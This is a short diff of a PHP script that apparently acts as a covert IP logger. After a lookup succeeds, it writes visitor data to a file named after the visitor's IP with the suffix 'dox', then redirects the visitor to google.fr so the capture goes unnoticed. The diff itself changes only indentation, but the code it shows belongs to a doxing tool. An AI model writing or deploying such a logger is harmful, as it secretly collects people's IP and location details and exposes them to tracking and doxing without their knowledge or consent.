@@ -47,8 +47,8 @@ if($query && $query['status'] == 'success')
     Date : " . $date;
     
     $dox = fopen("logs/" . $ip . "-dox.txt", "w+");
-	fputs($dox, $data);
-	fclose($dox);
+    fputs($dox, $data);
+    fclose($dox);
 	
 	header('Location: https://www.google.fr/');
 }
